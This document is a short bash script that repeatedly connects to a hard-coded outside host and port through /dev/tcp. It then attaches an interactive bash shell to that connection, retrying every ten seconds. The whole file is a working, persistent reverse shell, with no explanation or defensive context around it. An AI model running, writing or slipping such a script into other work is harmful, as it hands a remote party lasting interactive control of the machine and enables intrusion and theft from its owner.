#!/bin/bash

# Assign new IP address and port
IP="hour-vii.gl.at.ply.gg"
PORT="47054"

# Function to establish connection
connect() {
    exec 5<>/dev/tcp/$IP/$PORT
    if [ $? -ne 0 ]; then
        exit 1
    fi
}

# Function to start interactive shell
start_shell() {
    /bin/bash -i <&5 >&5 2>&5
}

# Main function
main() {
    while true; do
        connect
        start_shell
        # Sleep for a while before attempting reconnection
        sleep 10
    done
}

# Start the main function
main
